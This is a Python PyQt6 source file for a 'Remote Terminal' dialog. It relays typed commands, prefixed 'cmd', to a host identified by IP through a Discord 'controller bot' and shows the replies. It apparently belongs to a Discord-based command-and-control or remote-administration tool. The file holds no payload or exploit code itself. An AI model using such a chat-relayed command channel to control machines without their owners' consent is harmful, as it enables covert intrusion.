from PyQt6.QtWidgets import (QDialog, QVBoxLayout, QHBoxLayout, QTextEdit, 
                              QLineEdit, QPushButton, QLabel, QFileDialog)
from PyQt6.QtCore import Qt
from PyQt6.QtGui import QFont, QTextCursor
from gui.styles import Styles
from utils.discord_bot import DiscordBot
from utils.config_manager import ConfigManager

class TerminalDialog(QDialog):
    def __init__(self, parent, hostname: str, ip: str):
        super().__init__(parent)
        self.hostname = hostname
        self.ip = ip
        self.config = ConfigManager()
        self.controller_bot = getattr(parent, 'discord_bot', None)
        self.output_buffer = []
        self.history = []
        self.history_index = -1
        
        self.setWindowTitle(f"Terminal - {hostname}")
        self.setMinimumSize(800, 600)
        self.setStyleSheet(f"background-color: {Styles.BACKGROUND};")
        
        self.init_ui()
    
    def init_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(15)
        
        title_label = QLabel(f"Remote Terminal - {self.hostname}")
        title_label.setStyleSheet("""
            color: #ffffff;
            font-size: 18px;
            font-weight: bold;
        """)
        layout.addWidget(title_label)
        
        self.output = QTextEdit()
        self.output.setReadOnly(True)
        self.output.setStyleSheet(f"""
            QTextEdit {{
                background-color: {Styles.CARD_BG};
                color: #00ff00;
                border: 2px solid {Styles.PRIMARY};
                border-radius: 10px;
                padding: 15px;
                font-family: 'Consolas', 'Courier New', monospace;
                font-size: 12px;
            }}
        """)
        self.output.append(f"Connected to {self.hostname} ({self.ip})")
        self.output.append("Type commands and press Enter to execute...\n")
        layout.addWidget(self.output, 1)
        
        input_layout = QHBoxLayout()
        
        prompt_label = QLabel(f"{self.hostname}> ")
        prompt_label.setStyleSheet("""
            color: #00d4ff;
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 13px;
            font-weight: bold;
        """)
        input_layout.addWidget(prompt_label)
        
        self.input = QLineEdit()
        self.input.setStyleSheet(Styles.INPUT)
        self.input.setFixedHeight(40)
        self.input.returnPressed.connect(self.execute_command)
        self.input.keyPressEvent = self._wrap_keypress(self.input.keyPressEvent)
        input_layout.addWidget(self.input)
        
        send_btn = QPushButton("Send")
        send_btn.setStyleSheet(Styles.BUTTON)
        send_btn.setFixedSize(100, 40)
        send_btn.clicked.connect(self.execute_command)
        send_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        input_layout.addWidget(send_btn)

        clear_btn = QPushButton("Clear")
        clear_btn.setStyleSheet(Styles.BUTTON_SECONDARY)
        clear_btn.setFixedSize(100, 40)
        clear_btn.clicked.connect(self.clear_output)
        clear_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        input_layout.addWidget(clear_btn)

        save_btn = QPushButton("Save Output")
        save_btn.setStyleSheet(Styles.BUTTON_SECONDARY)
        save_btn.setFixedSize(130, 40)
        save_btn.clicked.connect(self.save_output)
        save_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        input_layout.addWidget(save_btn)
        
        layout.addLayout(input_layout)
        
        close_btn = QPushButton("Close")
        close_btn.setStyleSheet(Styles.BUTTON_SECONDARY)
        close_btn.setFixedSize(100, 40)
        close_btn.clicked.connect(self.close)
        close_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        layout.addWidget(close_btn, alignment=Qt.AlignmentFlag.AlignRight)
    
    def execute_command(self):
        command = self.input.text().strip()
        if not command:
            return
        if command.lower() in (':clear', 'clear', '/clear'):
            self.clear_output()
            self.input.clear()
            return
        
        self.output.append(f"\n{self.hostname}> {command}")
        self.output.moveCursor(QTextCursor.MoveOperation.End)
        self.output_buffer.append(f"{self.hostname}> {command}\n")

        if not (self.history and self.history[-1] == command):
            self.history.append(command)
        self.history_index = len(self.history)
        
        if self.controller_bot and self.controller_bot.is_ready():
            def _cb(text):
                self.output.append(text)
                self.output_buffer.append(text + ("\n" if not text.endswith('\n') else ""))
                self.output.moveCursor(QTextCursor.MoveOperation.End)
            try:
                self.controller_bot.register_terminal_callback(self.ip, _cb)
            except Exception:
                pass
            sent = self.controller_bot.send_command(self.ip, f"cmd {command}")
            if sent:
                self.output.append("Command sent. Waiting for response...")
                self.output_buffer.append("Command sent. Waiting for response...\n")
            else:
                self.output.append("Failed to send command (bot not ready)")
                self.output_buffer.append("Failed to send command (bot not ready)\n")
        else:
            self.output.append("Error: Controller bot not running.")
            self.output_buffer.append("Error: Controller bot not running.\n")
        
        self.input.clear()
        self.output.moveCursor(QTextCursor.MoveOperation.End)

    def clear_output(self):
        self.output.clear()
        self.output_buffer.clear()
        self.output.append(f"Connected to {self.hostname} ({self.ip})")
        self.output.append("Type commands and press Enter to execute...\n(Use 'clear' to clear, arrow keys for history)")

    def save_output(self):
        try:
            path, _ = QFileDialog.getSaveFileName(self, "Save Terminal Output", "terminal_output.txt", "Text Files (*.txt)")
            if path:
                with open(path, 'w', encoding='utf-8') as f:
                    f.write(''.join(self.output_buffer))
                try:
                    self.window().show_notification(f"Saved output to {path}", level='success')
                except Exception:
                    pass
        except Exception as e:
            try:
                self.window().show_notification(f"Failed to save output: {e}", level='error')
            except Exception:
                pass

    def _wrap_keypress(self, original):
        def handler(ev):
            key = ev.key()
            if key in (Qt.Key.Key_Up, Qt.Key.Key_Down):
                if not self.history:
                    return original(ev)
                if key == Qt.Key.Key_Up:
                    self.history_index = max(0, self.history_index - 1)
                else:
                    self.history_index = min(len(self.history), self.history_index + 1)
                if self.history_index == len(self.history):
                    self.input.clear()
                else:
                    self.input.setText(self.history[self.history_index])
                return
            return original(ev)
        return handler
